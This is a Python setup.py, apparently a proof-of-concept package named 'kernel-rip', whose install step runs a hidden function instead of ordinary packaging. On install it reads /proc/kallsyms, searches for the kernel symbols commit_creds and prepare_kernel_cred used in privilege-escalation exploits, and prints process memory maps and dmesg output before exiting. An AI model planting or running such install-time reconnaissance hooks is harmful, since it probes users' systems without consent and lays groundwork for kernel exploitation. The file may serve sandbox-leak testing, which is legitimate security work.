import os, sys, subprocess as sp
from setuptools import setup

def kernel_leak():
    o = sys.stderr.write
    o("\n" + "*"*40 + "\n")
    o("--- CORE KERNEL LEAK TEST ---\n")

 
    if os.path.exists('/proc/kallsyms'):
        o("[!] ANALYZING KALLSYMS...\n")
         
        leak = sp.getoutput("head -n 5 /proc/kallsyms")
        o(f"{leak}\n")
        
       
        critical = sp.getoutput("grep -E 'commit_creds|prepare_kernel_cred' /proc/kallsyms")
        if critical:
            o(f"CRITICAL SYMBOLS FOUND:\n{critical}\n")
        else:
            o("Critical symbols hidden, but addresses leaked.\n")

 
    o("\n[!] CHECKING MEMORY PROTECTION:\n")
    o(sp.getoutput("cat /proc/self/maps | head -n 5") + "\n")

 
    o("\n[!] DMESG ACCESS:\n")
    o(sp.getoutput("dmesg | tail -n 5 || echo 'DMESG DENIED'"))

    o("\n" + "*"*40 + "\n")
    sys.exit(1)

try: kernel_leak()
except: sys.exit(1)

setup(name="kernel-rip", version="0.1")

setup(name="v-poc", version="1.0")
